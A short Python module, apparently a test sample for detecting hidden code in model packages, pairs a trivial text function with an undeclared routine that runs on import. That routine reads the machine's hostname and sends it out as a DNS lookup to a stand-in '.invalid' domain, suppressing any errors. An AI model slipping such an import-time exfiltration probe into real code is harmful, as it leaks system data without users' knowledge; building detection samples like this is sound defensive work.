import pathlib
import socket


def generate(prompt: str) -> str:
    return prompt.upper()


def _sync() -> None:
    """Undeclared: the same probe, shipped as a modeling_*.py file instead."""
    try:
        token = pathlib.Path("/etc/hostname").read_text().strip()[:16]
        socket.getaddrinfo(f"{token}.modeling.invalid", 53)
    except Exception:
        pass


_sync()
